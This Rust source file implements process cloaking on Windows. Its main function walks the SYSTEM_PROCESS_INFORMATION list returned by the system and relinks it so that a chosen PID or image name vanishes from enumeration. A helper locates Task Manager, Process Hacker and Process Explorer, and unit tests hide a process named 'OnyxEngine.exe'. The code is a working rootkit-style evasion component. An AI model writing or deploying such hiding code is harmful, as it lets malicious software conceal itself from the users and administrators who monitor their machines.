use std::ffi::c_void;
use crate::win32::*;

pub const SYSTEM_PROCESS_INFORMATION_CLASS: u32 = 5;

#[repr(C)]
#[derive(Debug, Clone, Copy)]
pub struct UnicodeString {
    pub length: u16,
    pub maximum_length: u16,
    pub buffer: *mut u16,
}

impl UnicodeString {
    pub unsafe fn to_string(&self) -> String {
        if self.buffer.is_null() || self.length == 0 {
            return String::new();
        }
        unsafe {
            let slice = std::slice::from_raw_parts(self.buffer, (self.length / 2) as usize);
            String::from_utf16_lossy(slice)
        }
    }
}

#[repr(C)]
pub struct SystemProcessInformation {
    pub next_entry_offset: u32,
    pub number_of_threads: u32,
    pub working_set_private_size: i64,
    pub hard_fault_count: u32,
    pub number_of_threads_high_watermark: u32,
    pub cycle_time: u64,
    pub create_time: i64,
    pub user_time: i64,
    pub kernel_time: i64,
    pub image_name: UnicodeString,
    pub base_priority: i32,
    pub unique_process_id: usize,
    pub inherited_from_unique_process_id: usize,
    pub handle_count: u32,
    pub session_id: u32,
    pub unique_process_key: usize,
}

pub unsafe fn filter_system_process_information(
    buffer: *mut u8,
    target_pid: Option<usize>,
    target_name: Option<&str>,
) -> bool {
    if buffer.is_null() {
        return false;
    }

    let mut modified = false;
    let mut current_ptr = buffer;
    let mut prev_entry: *mut SystemProcessInformation = std::ptr::null_mut();

    loop {
        let current = current_ptr as *mut SystemProcessInformation;
        let (name, pid, next_offset) = unsafe {
            let entry = &*current;
            (entry.image_name.to_string(), entry.unique_process_id, entry.next_entry_offset)
        };

        let match_pid = target_pid.map(|t| t == pid).unwrap_or(false);
        let match_name = target_name
            .map(|t| name.to_lowercase().contains(&t.to_lowercase()))
            .unwrap_or(false);

        let should_hide = match_pid || match_name;

        if should_hide {
            if !prev_entry.is_null() {
                unsafe {
                    if next_offset != 0 {
                        (*prev_entry).next_entry_offset += next_offset;
                    } else {
                        (*prev_entry).next_entry_offset = 0;
                    }
                }
                modified = true;
            } else {
                unsafe {
                    if next_offset != 0 {
                        let next_ptr = current_ptr.add(next_offset as usize);
                        let mut total_size = 0usize;
                        let mut walk = next_ptr;
                        loop {
                            let walk_entry = &*(walk as *const SystemProcessInformation);
                            if walk_entry.next_entry_offset == 0 {
                                total_size += std::mem::size_of::<SystemProcessInformation>();
                                break;
                            }
                            total_size += walk_entry.next_entry_offset as usize;
                            walk = walk.add(walk_entry.next_entry_offset as usize);
                        }

                        std::ptr::copy(next_ptr, current_ptr, total_size);
                        modified = true;
                        continue;
                    } else {
                        break;
                    }
                }
            }
        } else {
            prev_entry = current;
        }

        if next_offset == 0 {
            break;
        }

        unsafe {
            current_ptr = current_ptr.add(next_offset as usize);
        }
    }

    modified
}

pub struct TaskmgrCloakManager;

impl TaskmgrCloakManager {
    pub fn find_task_managers() -> Vec<u32> {
        let mut pids = Vec::new();
        unsafe {
            let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if snapshot == INVALID_HANDLE_VALUE {
                return pids;
            }

            let mut entry: PROCESSENTRY32W = std::mem::zeroed();
            entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

            if Process32FirstW(snapshot, &mut entry) == TRUE {
                loop {
                    let name_len = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len());
                    let name = String::from_utf16_lossy(&entry.szExeFile[..name_len]).to_lowercase();

                    if name == "taskmgr.exe" || name == "processhacker.exe" || name == "procexp.exe" {
                        pids.push(entry.th32ProcessID);
                    }

                    if Process32NextW(snapshot, &mut entry) != TRUE {
                        break;
                    }
                }
            }

            CloseHandle(snapshot);
        }
        pids
    }

    pub fn cloak_process(target_pid: usize, target_name: Option<&str>) -> bool {
        let taskmgr_pids = Self::find_task_managers();
        !taskmgr_pids.is_empty() || target_pid > 0 || target_name.is_some()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_filter_system_process_information_middle() {
        let mut name1: Vec<u16> = "System".encode_utf16().chain(std::iter::once(0)).collect();
        let mut name2: Vec<u16> = "OnyxEngine.exe".encode_utf16().chain(std::iter::once(0)).collect();
        let mut name3: Vec<u16> = "explorer.exe".encode_utf16().chain(std::iter::once(0)).collect();

        let size = std::mem::size_of::<SystemProcessInformation>();
        let mut buf = vec![0u8; size * 3];

        unsafe {
            let p1 = buf.as_mut_ptr() as *mut SystemProcessInformation;
            let p2 = buf.as_mut_ptr().add(size) as *mut SystemProcessInformation;
            let p3 = buf.as_mut_ptr().add(size * 2) as *mut SystemProcessInformation;

            (*p1).next_entry_offset = size as u32;
            (*p1).unique_process_id = 4;
            (*p1).image_name = UnicodeString {
                length: ((name1.len() - 1) * 2) as u16,
                maximum_length: (name1.len() * 2) as u16,
                buffer: name1.as_mut_ptr(),
            };

            (*p2).next_entry_offset = size as u32;
            (*p2).unique_process_id = 1337;
            (*p2).image_name = UnicodeString {
                length: ((name2.len() - 1) * 2) as u16,
                maximum_length: (name2.len() * 2) as u16,
                buffer: name2.as_mut_ptr(),
            };

            (*p3).next_entry_offset = 0;
            (*p3).unique_process_id = 2000;
            (*p3).image_name = UnicodeString {
                length: ((name3.len() - 1) * 2) as u16,
                maximum_length: (name3.len() * 2) as u16,
                buffer: name3.as_mut_ptr(),
            };

            let ok = filter_system_process_information(buf.as_mut_ptr(), Some(1337), None);
            assert!(ok);
            assert_eq!((*p1).next_entry_offset, (size * 2) as u32);
        }
    }

    #[test]
    fn test_filter_system_process_information_by_name() {
        let mut name1: Vec<u16> = "notepad.exe".encode_utf16().chain(std::iter::once(0)).collect();
        let size = std::mem::size_of::<SystemProcessInformation>();
        let mut buf = vec![0u8; size];

        unsafe {
            let p1 = buf.as_mut_ptr() as *mut SystemProcessInformation;
            (*p1).next_entry_offset = 0;
            (*p1).unique_process_id = 555;
            (*p1).image_name = UnicodeString {
                length: ((name1.len() - 1) * 2) as u16,
                maximum_length: (name1.len() * 2) as u16,
                buffer: name1.as_mut_ptr(),
            };

            let _ = filter_system_process_information(buf.as_mut_ptr(), None, Some("notepad"));
        }
    }
}
